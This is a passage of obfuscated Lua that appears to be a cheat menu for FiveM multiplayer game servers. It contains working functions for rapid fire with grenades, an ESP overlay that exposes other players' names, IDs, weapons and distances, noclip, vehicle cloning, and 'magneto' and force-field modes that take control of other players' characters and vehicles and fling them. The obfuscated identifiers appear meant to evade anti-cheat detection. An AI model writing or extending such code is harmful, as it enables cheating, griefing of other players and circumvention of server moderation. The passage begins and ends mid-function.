        if DoesEntityExist(RV2P_zOkzGC5n0VZT) then
            local PfC9z99G, ZQ, XeyNaCmPwfsV0naU1kLDb = table.unpack(GetEntityCoords(PlayerPedId()))
            if wHsxZwUyYdZM == 1 then
                SetEntityCoords(PlayerPedId(), PfC9z99G + 1, ZQ + 2, XeyNaCmPwfsV0naU1kLDb + 100.0)
            elseif wHsxZwUyYdZM == 2 then
                SetEntityCoords(PlayerPedId(), 195.23, -934.04, 30.69)
            elseif wHsxZwUyYdZM == 3 then
                SetEntityCoords(PlayerPedId(), -1653.85, -860.87, 9.16)
            elseif wHsxZwUyYdZM == 4 then
                SetEntityCoords(PlayerPedId(), 2024.28, 3770.94, 32.18)
            elseif wHsxZwUyYdZM == 5 then
                SetEntityCoords(PlayerPedId(), -183.57, 6366.65, 31.47)
            end
            local BaOhGHEx0Ern =
                CreatePedInsideVehicle(RV2P_zOkzGC5n0VZT, 4, GetEntityModel(PlayerPedId()), -1, true, false)
            MaciasFunc.sPO.clonePedOutfit(BaOhGHEx0Ern, PlayerPedId())
            SetEntityAsMissionEntity(BaOhGHEx0Ern, 0, 0)
            TaskVehicleDriveToCoordLongrange(
                BaOhGHEx0Ern,
                RV2P_zOkzGC5n0VZT,
                -34.552,
                -673.06,
                31.944,
                100.0,
                537657916,
                1
            )
            SetDriveTaskDrivingStyle(BaOhGHEx0Ern, 6)
            local e = GetEntityModel(RV2P_zOkzGC5n0VZT)
            local Yp2FHQrqAnxM = MaciasFunc.sPO.SpawnVehicleToPlayer(e, PlayerId())
            local sRvNaCcbpF = MaciasFunc.Game.GetVehicleProperties(RV2P_zOkzGC5n0VZT)
            sRvNaCcbpF.plate = nil
            MaciasFunc.Game.SetVehicleProperties(Yp2FHQrqAnxM, sRvNaCcbpF)
        else
            print("vehicle entity doesnt exist")
        end
    else
        print("youre not in a vehicle")
    end
end
local p3DWF = false
MaciasFunc.vehicle2Step = function()
    p_flame_location = {
        "exhaust",
        "exhaust_2",
        "exhaust_3",
        "exhaust_4",
        "exhaust_5",
        "exhaust_6",
        "exhaust_7",
        "exhaust_8",
        "exhaust_9",
        "exhaust_10",
        "exhaust_11",
        "exhaust_12",
        "exhaust_13",
        "exhaust_14",
        "exhaust_15",
        "exhaust_16"
    }
    p_flame_particle = "veh_backfire"
    p_flame_particle_asset = "core"
    p_flame_size = 2
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        local S97ygq1fLm3fId45CB = GetVehiclePedIsIn(GetPlayerPed(-1))
        local JSSRl5_7zXizqERQl156V = GetEntityCoords(GetPlayerPed(-1))
        local sKmXmeFqVKlDZR7AslWr = GetEntityCoords(S97ygq1fLm3fId45CB)
        local zi3WSRo14kGEIsSxowL = GetVehicleCurrentRpm(GetVehiclePedIsIn(GetPlayerPed(-1)))
        if GetPedInVehicleSeat(S97ygq1fLm3fId45CB, -1) == GetPlayerPed(-1) then
            local L8k = (math.random(250.0, 750))
            local f7OhVjgqX5 = (math.random(2, 6) / 1.5)
            if zi3WSRo14kGEIsSxowL > 0.3 and zi3WSRo14kGEIsSxowL < 0.6 then
                for irGIL3P, ZoPL3RYjkZ4esPTua in pairs(p_flame_location) do
                    if GetEntityBoneIndexByName(S97ygq1fLm3fId45CB, ZoPL3RYjkZ4esPTua) >= 0 then
                        UseParticleFxAssetNextCall(p_flame_particle_asset)
                        createdPart =
                            StartParticleFxLoopedOnEntityBone(
                            p_flame_particle,
                            NetToVeh(VehToNet(S97ygq1fLm3fId45CB)),
                            0,
                            0,
                            0,
                            0,
                            0,
                            0,
                            GetEntityBoneIndexByName(NetToVeh(VehToNet(S97ygq1fLm3fId45CB)), ZoPL3RYjkZ4esPTua),
                            f7OhVjgqX5,
                            0,
                            0,
                            0
                        )
                        StopParticleFxLooped(createdPart, 1)
                    end
                end
                AddExplosion(
                    sKmXmeFqVKlDZR7AslWr.x,
                    sKmXmeFqVKlDZR7AslWr.y,
                    sKmXmeFqVKlDZR7AslWr.z,
                    61,
                    0,
                    true,
                    true,
                    0,
                    true
                )
                p3DWF = true
                Citizen.Wait(L8k)
            else
                p3DWF = false
            end
        end
    end
end
MaciasFunc.maxUpgrades = function(CkGFKC6)
    SetVehicleModKit(CkGFKC6, 0)
    SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
    SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0), 0, 0, 0)
    SetVehicleColours(CkGFKC6, 12, 12)
    SetVehicleModColor_1(CkGFKC6, 3, 0)
    SetVehicleExtraColours(CkGFKC6, 3, 0)
    ToggleVehicleMod(CkGFKC6, 18, 1)
    ToggleVehicleMod(CkGFKC6, 22, 1)
    SetVehicleMod(CkGFKC6, 16.0, 5, 0)
    SetVehicleMod(CkGFKC6, 12, 2, 0)
    SetVehicleMod(CkGFKC6, 11, 3, 0)
    SetVehicleMod(CkGFKC6, 14, 14, 0)
    SetVehicleMod(CkGFKC6, 15, 3, 0)
    SetVehicleMod(CkGFKC6, 13, 2, 0)
    SetVehicleWindowTint(CkGFKC6, 5)
    SetVehicleWheelType(CkGFKC6, 0)
    SetVehicleMod(CkGFKC6, 23, 21, 1)
    SetVehicleMod(CkGFKC6, 0, 1, 0)
    SetVehicleMod(CkGFKC6, 1, 1, 0)
    SetVehicleMod(CkGFKC6, 2, 1, 0)
    SetVehicleMod(CkGFKC6, 3, 1, 0)
    SetVehicleMod(CkGFKC6, 4, 1, 0)
    SetVehicleMod(CkGFKC6, 5, 1, 0)
    SetVehicleMod(CkGFKC6, 6, 1, 0)
    SetVehicleMod(CkGFKC6, 7, 1, 0)
    SetVehicleMod(CkGFKC6, 8, 1, 0)
    SetVehicleMod(CkGFKC6, 9, 1, 0)
    SetVehicleMod(CkGFKC6, 10, 1, 0)
    IsVehicleNeonLightEnabled(CkGFKC6, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 0, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 1, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 2, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 3, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 4, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 5, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 6, 1)
    SetVehicleNeonLightEnabled(CkGFKC6, 7, 1)
    SetVehicleNeonLightsColour(CkGFKC6, YKyAw.r, YKyAw.g, YKyAw.b)
    SetVehicleModKit(CkGFKC6, 0)
    ToggleVehicleMod(CkGFKC6, 20, 1)
    SetVehicleModKit(CkGFKC6, 0)
    SetVehicleTyreSmokeColor(CkGFKC6, YKyAw.r, YKyAw.g, YKyAw.b)
end
MaciasFunc.maxPerformanceUpgrades = function(cJwlK_)
    SetVehicleModKit(cJwlK_, 0)
    SetVehicleMod(cJwlK_, 11, GetNumVehicleMods(cJwlK_, 11) - 1, false)
    SetVehicleMod(cJwlK_, 12, GetNumVehicleMods(cJwlK_, 12) - 1, false)
    SetVehicleMod(cJwlK_, 13, GetNumVehicleMods(cJwlK_, 13) - 1, false)
    SetVehicleMod(cJwlK_, 15, GetNumVehicleMods(cJwlK_, 15) - 2, false)
    SetVehicleMod(cJwlK_, 16.0, GetNumVehicleMods(cJwlK_, 16.0) - 1, false)
    ToggleVehicleMod(cJwlK_, 17, true)
    ToggleVehicleMod(cJwlK_, 18, true)
    ToggleVehicleMod(cJwlK_, 19, true)
    ToggleVehicleMod(cJwlK_, 21, true)
end
MaciasFunc.spawnVehicle = function(r9i_eO10MQTXkJ2j)
    local vCrKv1fyK7kFoTBn3TN, pGU91YYvnraT8Ftx5v3, ZwZy0H =
        table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0, 8, 0.5))
    local vBqHUxOh3 = r9i_eO10MQTXkJ2j
    if vBqHUxOh3 == nil then
        vBqHUxOh3 = "elegy"
    end
    vehiclehash = GetHashKey(vBqHUxOh3)
    RequestModel(vehiclehash)
    requestModel(vehiclehash)
    Citizen.CreateThread(
        function()
            local LAwM9UUvcVdug = 0
            while not HasModelLoaded(vehiclehash) do
                LAwM9UUvcVdug = LAwM9UUvcVdug + 100.0
                Citizen.Wait(100.0)
                if LAwM9UUvcVdug > 5000 then
                    Macias.PushNotification("Could not spawn this vehicle!", 5000)
                    break
                end
            end
            SpawnedCar =
                CreateVehicle(
                vehiclehash,
                vCrKv1fyK7kFoTBn3TN,
                pGU91YYvnraT8Ftx5v3,
                ZwZy0H,
                GetEntityHeading(PlayerPedId(-1)) + 90,
                1,
                0
            )
            SetVehicleStrong(SpawnedCar, true)
            SetVehicleEngineOn(SpawnedCar, true, true, false)
            SetVehicleEngineCanDegrade(SpawnedCar, false)
            if jU7z1fNT_Pbj85qJpm then
                MaciasFunc.maxUpgrades(SpawnedCar)
            end
            if G8zTCymQ1Rx1 then
                SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
            end
        end
    )
end
MaciasFunc.spawnCustomVehicle = function(iGD, jLhFUES7D08e)
    RequestModel(iGD)
    requestModel(GetHashKey(iGD))
    Citizen.CreateThread(
        function()
            local R2LoYKv48wqJ = 0
            if iGD == nil then
                iGD = "elegy"
            end
            while not HasModelLoaded(GetHashKey(iGD)) do
                R2LoYKv48wqJ = R2LoYKv48wqJ + 100.0
                Citizen.Wait(100.0)
                if R2LoYKv48wqJ > 5000 then
                    Macias.PushNotification("Could not spawn this vehicle!", 5000)
                    break
                end
            end
            SpawnedCar =
                CreateVehicle(
                GetHashKey(iGD),
                GetEntityCoords(PlayerPedId()),
                GetEntityHeading(PlayerPedId()),
                true,
                true
            )
            SetVehicleStrong(SpawnedCar, true)
            SetVehicleEngineOn(SpawnedCar, true, true, false)
            SetVehicleEngineCanDegrade(SpawnedCar, false)
            if string.IsNullOrEmpty(jLhFUES7D08e) then
                SetVehicleNumberPlateText(SpawnedCar, GetVehicleNumberPlateText(SpawnedCar))
            else
                SetVehicleNumberPlateText(SpawnedCar, jLhFUES7D08e)
            end
            if jU7z1fNT_Pbj85qJpm then
                MaciasFunc.maxUpgrades(SpawnedCar)
            end
            if G8zTCymQ1Rx1 then
                SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
            end
        end
    )
end
local function Wn1noLPWym_zY(ofAIaiIA3, reT8SSf, a_N5uB4Xz3m30J4)
    local uQcsYuI = GetPedBoneCoords(ofAIaiIA3, GetEntityBoneIndexByName(ofAIaiIA3, reT8SSf), 0, 0, 0)
    local sR9UW3q, Ai3FcbKEdt2HqrLlYQvA = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(
        AddVectors(uQcsYuI, vector3(0, 0, 0.1)),
        uQcsYuI,
        a_N5uB4Xz3m30J4,
        true,
        Ai3FcbKEdt2HqrLlYQvA,
        PlayerPedId(),
        true,
        true,
        1000.0
    )
end
MaciasFunc.runAimbot = function()
end
MaciasFunc.rapidFireTick = function()
    if IsDisabledControlPressed(0, keyboard_keys["MOUSE1"]) then
        local yfHjNov287jn_7pr9v, U4wUU8_OUNI = GetCurrentPedWeapon(PlayerPedId())
        local QP46UO6xh4QYhUv = GetEntityCoords(GetCurrentPedWeaponEntityIndex(PlayerPedId()))
        local jGbjON0MXTndZj = GetGameplayCamCoord() + (GetCamDirFromScreenCenter() * 200)
        ClearAreaOfProjectiles(QP46UO6xh4QYhUv, 0, 1)
        ShootSingleBulletBetweenCoords(
            QP46UO6xh4QYhUv,
            jGbjON0MXTndZj,
            5,
            1,
            U4wUU8_OUNI,
            PlayerPedId(),
            true,
            true,
            24000.0
        )
        if MIPSqLh9aOgDF2JHx then
            ShootSingleBulletBetweenCoords(
                QP46UO6xh4QYhUv,
                jGbjON0MXTndZj,
                5,
                1,
                "WEAPON_GRENADE",
                PlayerPedId(),
                true,
                true,
                24000.0
            )
        end
    end
end
function DrawText3D(gXWF65AmAW1Nt82, ERrao4NeoScyl5JPRU, hD, Bqfyh5hdv9e, DWbXyCX, rHReYKNrG4pMHuF, LqD4dVliESAHeg6)
    SetDrawOrigin(gXWF65AmAW1Nt82, ERrao4NeoScyl5JPRU, hD, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0, 0.2)
    SetTextColour(DWbXyCX, rHReYKNrG4pMHuF, LqD4dVliESAHeg6, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(Bqfyh5hdv9e)
    DrawText(0, 0)
    ClearDrawOrigin()
end
MaciasFunc.toggleESP = function()
    local RMZ, p, pfTFmcnV = false, 0, 0
    Citizen.CreateThread(
        function()
            while iFJo9N75fE6X and NywuctsA4BD4b3_G0 do
                local SSnnRpekRuzNb = GetActivePlayers()
                table.removekey(SSnnRpekRuzNb, PlayerId())
                for i = 1, #SSnnRpekRuzNb do
                    local I0DEMVhTBWfuokvkvuY3 = GetEntityCoords(GetPlayerPed(SSnnRpekRuzNb[i]))
                    RMZ, p, pfTFmcnV =
                        GetScreenCoordFromWorldCoord(
                        I0DEMVhTBWfuokvkvuY3.x,
                        I0DEMVhTBWfuokvkvuY3.y,
                        I0DEMVhTBWfuokvkvuY3.z
                    )
                    local b1pUJsXSRCgHyIEhDsy05 =
                        GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), I0DEMVhTBWfuokvkvuY3)
                    if b1pUJsXSRCgHyIEhDsy05 <= visualsESPDistance then
                        local Get8LUKNDm, I9gbIa = GetCurrentPedWeapon(GetPlayerPed(SSnnRpekRuzNb[i]), 1)
                        local UlAH31Npatsh5Twi = GetWeaponNameFromHash(I9gbIa)
                        local ndGA = "On Foot"
                        if IsPedInAnyVehicle(GetPlayerPed(SSnnRpekRuzNb[i]), 0) then
                            ndGA =
                                GetLabelText(
                                GetDisplayNameFromVehicleModel(
                                    GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(SSnnRpekRuzNb[i])))
                                )
                            )
                        end
                        if UlAH31Npatsh5Twi == nil then
                            UlAH31Npatsh5Twi = "Unknown"
                        end
                        local vBjlJ9 = " "
                        local hiSbtTE8PQsg4A6ZB = " "
                        if cCCjZqd78 then
                            vBjlJ9 = vBjlJ9 .. "~s~ | ~w~ID: ~s~" .. GetPlayerServerId(SSnnRpekRuzNb[i])
                        end
                        if A__TqtbeQPVTbDeT then
                            vBjlJ9 = vBjlJ9 .. "~s~ | ~w~Name: ~s~" .. GetPlayerName(SSnnRpekRuzNb[i])
                        end
                        if FUxbInvVV02Fi then
                            vBjlJ9 = vBjlJ9 .. "~s~ | ~w~Distance: ~s~" .. math.floor(b1pUJsXSRCgHyIEhDsy05) .. "~s~ |"
                        end
                        if ECclILYClVywd2ROgA0J then
                            hiSbtTE8PQsg4A6ZB = hiSbtTE8PQsg4A6ZB .. "~s~ | ~w~Weapon: ~s~" .. UlAH31Npatsh5Twi
                        end
                        if xaEYqsfYZ then
                            hiSbtTE8PQsg4A6ZB = hiSbtTE8PQsg4A6ZB .. "~s~ | ~w~Vehicle: ~s~" .. ndGA
                        end
                        DrawTxt(vBjlJ9, p - 0.04, pfTFmcnV - 0.04, 0, 0.3, YKyAw)
                        DrawTxt(hiSbtTE8PQsg4A6ZB, p - 0.04, pfTFmcnV - 0.03, 0, 0.3, YKyAw)
                    end
                end
                Citizen.Wait(gCMfMaXEV)
            end
        end
    )
end
MaciasFunc.toggleNoclip = function()
    XYqiiJ9l6pXVPOizE = not XYqiiJ9l6pXVPOizE
    if not XYqiiJ9l6pXVPOizE then
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
    end
end
local function iQqmSceJty()
    local pNudpS_vh = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local iWyS8C8 = GetGameplayCamRelativePitch()
    local y4Z8kr = -math.sin(pNudpS_vh * math.pi / 180.0)
    local eUhYnCEaTCMWvTA = math.cos(pNudpS_vh * math.pi / 180.0)
    local iXRAthXP = math.sin(iWyS8C8 * math.pi / 180.0)
    local XLKiyQgyj3m = math.sqrt(y4Z8kr * y4Z8kr + eUhYnCEaTCMWvTA * eUhYnCEaTCMWvTA + iXRAthXP * iXRAthXP)
    if XLKiyQgyj3m ~= 0 then
        y4Z8kr = y4Z8kr / XLKiyQgyj3m
        eUhYnCEaTCMWvTA = eUhYnCEaTCMWvTA / XLKiyQgyj3m
        iXRAthXP = iXRAthXP / XLKiyQgyj3m
    end
    return y4Z8kr, eUhYnCEaTCMWvTA, iXRAthXP
end
MaciasFunc.noclipAdv = function()
    local eEOFXOUvBywbaHeekC = IsPedInAnyVehicle(PlayerPedId(), 0)
    local B6PgaWu = nil
    local yO9VQj2M4qK, fJtO5_aBC, BprfMa6WiQAzEtPYCKP = nil
    if not eEOFXOUvBywbaHeekC then
        B6PgaWu = PlayerPedId()
        yO9VQj2M4qK, fJtO5_aBC, BprfMa6WiQAzEtPYCKP = table.unpack(GetEntityCoords(PlayerPedId(), 2))
    else
        B6PgaWu = GetVehiclePedIsIn(PlayerPedId(), 0)
        yO9VQj2M4qK, fJtO5_aBC, BprfMa6WiQAzEtPYCKP = table.unpack(GetEntityCoords(PlayerPedId(), 1))
    end
    if eEOFXOUvBywbaHeekC and GetSeatPedIsIn(PlayerPedId()) ~= -1 then
        RequestControlOnce(B6PgaWu)
    end
    SetEntityVelocity(B6PgaWu, 0.0001, 0.0001, 0.0001)
    if IsDisabledControlJustPressed(0, keyboard_keys["LEFTSHIFT"]) then
        hCPJ_C = t0i6VcwX_pxQZE
        t0i6VcwX_pxQZE = t0i6VcwX_pxQZE * 2
    end
    if IsDisabledControlJustReleased(0, keyboard_keys["LEFTSHIFT"]) then
        t0i6VcwX_pxQZE = hCPJ_C
    end
    if IsDisabledControlPressed(0, 32) then
        yO9VQj2M4qK = yO9VQj2M4qK + t0i6VcwX_pxQZE * dx
        fJtO5_aBC = fJtO5_aBC + t0i6VcwX_pxQZE * dy
        BprfMa6WiQAzEtPYCKP = BprfMa6WiQAzEtPYCKP + t0i6VcwX_pxQZE * dz
    end
    if IsDisabledControlPressed(0, 269) then
        yO9VQj2M4qK = yO9VQj2M4qK - t0i6VcwX_pxQZE * dx
        fJtO5_aBC = fJtO5_aBC - t0i6VcwX_pxQZE * dy
        BprfMa6WiQAzEtPYCKP = BprfMa6WiQAzEtPYCKP - t0i6VcwX_pxQZE * dz
    end
    if IsDisabledControlPressed(0, keyboard_keys["SPACE"]) then
        BprfMa6WiQAzEtPYCKP = BprfMa6WiQAzEtPYCKP + t0i6VcwX_pxQZE
    end
    if IsDisabledControlPressed(0, keyboard_keys["LEFTCTRL"]) then
        BprfMa6WiQAzEtPYCKP = BprfMa6WiQAzEtPYCKP - t0i6VcwX_pxQZE
    end
    SetEntityCoordsNoOffset(B6PgaWu, yO9VQj2M4qK, fJtO5_aBC, BprfMa6WiQAzEtPYCKP, true, true, true)
end
MaciasFunc.magnetoMode = function()
    if H7cLu4d_tt66oyk2nGoSu then
        Citizen.CreateThread(
            function()
                local ajBQu2lNf = keyboard_keys[NXStf]
                local NoULcTJJTFHicdMy = 0.5
                local H9y3YGgaskbl = false
                local KncR1qRn9jN = 0
                local E1yjoHSQ4549 = 15
                local p2AqUo4v0c2 = false
                local tPbRgov6fiBTY7L5C = false
                function forcetick()
                    if (H9y3YGgaskbl) then
                        KncR1qRn9jN = KncR1qRn9jN + 1
                        if (KncR1qRn9jN >= E1yjoHSQ4549) then
                            KncR1qRn9jN = 0
                            H9y3YGgaskbl = false
                        end
                    end
                    if IsDisabledControlPressed(0, ajBQu2lNf) and not H9y3YGgaskbl and not p2AqUo4v0c2 then
                        H9y3YGgaskbl = true
                        p2AqUo4v0c2 = true
                    end
                    if (tPbRgov6fiBTY7L5C) then
                        tPbRgov6fiBTY7L5C = false
                        local bzHzTXWYlAPj = PlayerPedId()
                        local kDxGUxhMps = GetGameplayCamRot(2)
                        local xv5 = 5
                        local IrdhAhkl_XndDl7kRSlBh = -(math.sin(math.rad(kDxGUxhMps.z)) * xv5 * 10)
                        local xUvKxtZlScyzburaaY = (math.cos(math.rad(kDxGUxhMps.z)) * xv5 * 10)
                        local ix = xv5 * (kDxGUxhMps.x * 0.2)
                        local kWkCSL1pcCV2eolDgj = GetVehiclePedIsIn(bzHzTXWYlAPj, false)
                        for a8M in EnumerateVehicles() do
                            SetEntityInvincible(a8M, false)
                            if IsEntityOnScreen(a8M) and a8M ~= kWkCSL1pcCV2eolDgj then
                                ApplyForceToEntity(
                                    a8M,
                                    1,
                                    IrdhAhkl_XndDl7kRSlBh,
                                    xUvKxtZlScyzburaaY,
                                    ix,
                                    0,
                                    0,
                                    0,
                                    true,
                                    false,
                                    true,
                                    true,
                                    true,
                                    true
                                )
                            end
                        end
                        for iV in EnumeratePeds() do
                            if IsEntityOnScreen(iV) and iV ~= bzHzTXWYlAPj then
                                ApplyForceToEntity(
                                    iV,
                                    1,
                                    IrdhAhkl_XndDl7kRSlBh,
                                    xUvKxtZlScyzburaaY,
                                    ix,
                                    0,
                                    0,
                                    0,
                                    true,
                                    false,
                                    true,
                                    true,
                                    true,
                                    true
                                )
                            end
                        end
                    end
                    if IsDisabledControlPressed(0, ajBQu2lNf) and not H9y3YGgaskbl and p2AqUo4v0c2 then
                        H9y3YGgaskbl = true
                        tPbRgov6fiBTY7L5C = true
                        p2AqUo4v0c2 = false
                    end
                    if (p2AqUo4v0c2) then
                        local qCr1Prn = PlayerPedId()
                        local i6P18agoZDmuTcIUB0 = GetVehiclePedIsIn(qCr1Prn, false)
                        Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                        DrawMarker(
                            28,
                            Markerloc,
                            0,
                            0,
                            0,
                            0,
                            180.0,
                            0,
                            1,
                            1,
                            1,
                            YKyAw.r,
                            YKyAw.g,
                            YKyAw.b,
                            35,
                            false,
                            true,
                            2,
                            nil,
                            nil,
                            false
                        )
                        for JSlEgs2YfBAbb1_vj3Uf in EnumerateVehicles() do
                            SetEntityInvincible(JSlEgs2YfBAbb1_vj3Uf, true)
                            if IsEntityOnScreen(JSlEgs2YfBAbb1_vj3Uf) and (JSlEgs2YfBAbb1_vj3Uf ~= i6P18agoZDmuTcIUB0) then
                                RequestControlOnce(JSlEgs2YfBAbb1_vj3Uf)
                                FreezeEntityPosition(JSlEgs2YfBAbb1_vj3Uf, false)
                                forceOscillate(JSlEgs2YfBAbb1_vj3Uf, Markerloc, 0.5, 0.3)
                            end
                        end
                        for fnQ0R in EnumeratePeds() do
                            if IsEntityOnScreen(fnQ0R) and fnQ0R ~= PlayerPedId() then
                                RequestControlOnce(fnQ0R)
                                SetPedToRagdoll(fnQ0R, 4000, 5000, 0, true, true, true)
                                FreezeEntityPosition(fnQ0R, false)
                                forceOscillate(fnQ0R, Markerloc, 0.5, 0.3)
                            end
                        end
                    end
                end
                while H7cLu4d_tt66oyk2nGoSu do
                    forcetick()
                    Wait(0)
                end
            end
        )
    end
end
function ApplyShockwave(s)
    local NlLeqC99liWYb5a7u = GetEntityCoords(PlayerPedId())
    local b0h9NMUn8qe76Ja = GetEntityCoords(s)
    local BfBi6tZdh = b0h9NMUn8qe76Ja.x - NlLeqC99liWYb5a7u.x
    local NxxvIuGRHwcQpsM4Aj = b0h9NMUn8qe76Ja.y - NlLeqC99liWYb5a7u.y
    local pAk48 = b0h9NMUn8qe76Ja.z - NlLeqC99liWYb5a7u.z
    local U6Kz9 = math.sqrt(BfBi6tZdh * BfBi6tZdh + NxxvIuGRHwcQpsM4Aj * NxxvIuGRHwcQpsM4Aj + pAk48 * pAk48)
    local m4iNWuJgimy6KaN = (50 / U6Kz9) * math.pow(1.04, 1 - U6Kz9)
    ApplyForceToEntity(
        s,
        1,
        m4iNWuJgimy6KaN * BfBi6tZdh,
        m4iNWuJgimy6KaN * NxxvIuGRHwcQpsM4Aj,
        m4iNWuJgimy6KaN * pAk48,
        math.random() * math.random(1, 10),
        math.random() * math.random(-1, 1),
        math.random() * math.random(-1, 1),
        true,
        false,
        true,
        true,
        true,
        true
    )
end
MaciasFunc.doForceFieldTick = function(aADV)
    local DM3NxXXdDk9CyPqaY = PlayerPedId()
    local GbeUBYSGyze9qLzsSs = GetEntityCoords(PlayerPedId())
    local LsUgWKaPX24cTl4JY = GetPlayersLastVehicle()
    local sP6ylWOujf = IsPedInVehicle(DM3NxXXdDk9CyPqaY, LsUgWKaPX24cTl4JY, true)
    DrawMarker(
        28,
        GbeUBYSGyze9qLzsSs.x,
        GbeUBYSGyze9qLzsSs.y,
        GbeUBYSGyze9qLzsSs.z,
        0,
        0,
        0,
        0,
        180.0,
        0,
        aADV,
        aADV,
        aADV,
        180.0,
        80,
        0,
        35,
        false,
        true,
        2,
        nil,
        nil,
        false
    )
    for iDUM5SyGCd in EnumerateVehicles() do
        if
            (not sP6ylWOujf or iDUM5SyGCd ~= LsUgWKaPX24cTl4JY) and
                GetDistanceBetweenCoords(GbeUBYSGyze9qLzsSs, GetEntityCoords(iDUM5SyGCd)) <= aADV * 1.2
         then
            RequestControlOnce(iDUM5SyGCd)
            ApplyShockwave(iDUM5SyGCd)
        end
    end
    for LR38iNueSLjXght in EnumeratePeds() do
        if
            LR38iNueSLjXght ~= PlayerPedId() and
                GetDistanceBetweenCoords(GbeUBYSGyze9qLzsSs, GetEntityCoords(LR38iNueSLjXght)) <= aADV * 1.2
         then
            RequestControlOnce(LR38iNueSLjXght)
            if NetworkHasControlOfEntity(LR38iNueSLjXght) then
                SetPedRagdollOnCollision(LR38iNueSLjXght, true)
                SetPedRagdollForceFall(LR38iNueSLjXght)
                ApplyShockwave(LR38iNueSLjXght)
            end
        end
    end
end
MaciasFunc.randomClothes = function(bgom4E7D1PfxiMnsb)
    Citizen.CreateThread(
        function()
            local ud = GetPlayerPed(bgom4E7D1PfxiMnsb)
            SetPedRandomComponentVariation(ud, false)
            SetPedRandomProps(ud)
        end
    )
end
MaciasFunc.playerBlips = function()
    z_nQ = not z_nQ
    local QQDEI165omK3 = {}
    if not z_nQ then
        for i = 1, #QQDEI165omK3 do
            RemoveBlip(QQDEI165omK3[i])
            QQDEI165omK3 = {}
        end
    else
        Citizen.CreateThread(
            function()
                while z_nQ and NywuctsA4BD4b3_G0 do
                    local W5eDh1a2r1deL = GetActivePlayers()
                    table.removekey(W5eDh1a2r1deL, PlayerId())
                    for i = 1, #W5eDh1a2r1deL do
                        if NetworkIsPlayerActive(W5eDh1a2r1deL[i]) then
                            ped = GetPlayerPed(W5eDh1a2r1deL[i])
                            QQDEI165omK3[i] = GetBlipFromEntity(ped)
                            if not DoesBlipExist(QQDEI165omK3[i]) then
                                QQDEI165omK3[i] = AddBlipForEntity(ped)
                                SetBlipSprite(QQDEI165omK3[i], 1)
                                Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], true)
                            else
                                veh = GetVehiclePedIsIn(ped, false)
                                blipSprite = GetBlipSprite(QQDEI165omK3[i])
                                if not GetEntityHealth(ped) then
                                    if blipSprite ~= 274 then
                                        SetBlipSprite(QQDEI165omK3[i], 274)
                                        Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                    end
                                elseif veh then
                                    vehClass = GetVehicleClass(veh)
                                    vehModel = GetEntityModel(veh)
                                    if vehClass == 15 then
                                        if blipSprite ~= 422 then
                                            SetBlipSprite(QQDEI165omK3[i], 422)
                                            Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                        end
                                    elseif vehClass == 16.0 then
                                        if
                                            vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or
                                                vehModel == GetHashKey("lazer")
                                         then
                                            if blipSprite ~= 424 then
                                                SetBlipSprite(QQDEI165omK3[i], 424)
                                                Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                            end
                                        elseif blipSprite ~= 423 then
                                            SetBlipSprite(QQDEI165omK3[i], 423)
                                            Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                        end
                                    elseif vehClass == 14 then
                                        if blipSprite ~= 427 then
                                            SetBlipSprite(QQDEI165omK3[i], 427)
                                            Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                        end
                                    elseif
                                        vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or
                                            vehModel == GetHashKey("limo2")
                                     then
                                        if blipSprite ~= 426 then
                                            SetBlipSprite(QQDEI165omK3[i], 426)
                                            Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                        end
                                    elseif vehModel == GetHashKey("rhino") then
                                        if blipSprite ~= 421 then
                                            SetBlipSprite(QQDEI165omK3[i], 421)
                                            Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], false)
                                        end
                                    elseif blipSprite ~= 1 then
                                        SetBlipSprite(QQDEI165omK3[i], 1)
                                        Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], true)
                                    end
                                    passengers = GetVehicleNumberOfPassengers(veh)
                                    if passengers then
                                        if not IsVehicleSeatFree(veh, -1) then
                                            passengers = passengers + 1
                                        end
                                        ShowNumberOnBlip(QQDEI165omK3[i], passengers)
                                    else
                                        HideNumberOnBlip(QQDEI165omK3[i])
                                    end
                                else
                                    HideNumberOnBlip(QQDEI165omK3[i])
                                    if blipSprite ~= 1 then
                                        SetBlipSprite(QQDEI165omK3[i], 1)
                                        Citizen.InvokeNative(6898569612438869215, QQDEI165omK3[i], true)
                                    end
                                end
                                SetBlipRotation(QQDEI165omK3[i], math.ceil(GetEntityHeading(veh)))
                                SetBlipNameToPlayerName(QQDEI165omK3[i], W5eDh1a2r1deL[i])
